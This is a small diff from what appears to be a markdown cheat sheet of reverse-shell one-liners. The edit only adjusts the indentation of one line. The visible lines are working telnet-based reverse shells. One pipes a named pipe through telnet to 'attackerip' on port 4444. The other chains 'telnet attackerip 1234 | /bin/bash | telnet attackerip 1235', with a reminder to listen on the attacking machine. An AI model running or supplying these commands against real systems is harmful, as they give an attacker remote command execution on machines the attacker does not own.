@@ -103,7 +103,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
 ```
 
 ```bash
- telnet attackerip 1234 | /bin/bash | telnet attackerip 1235 
+telnet attackerip 1234 | /bin/bash | telnet attackerip 1235 
 ```
 _remember to listen on port 1235 on th attacking machine also._
 ## PHP
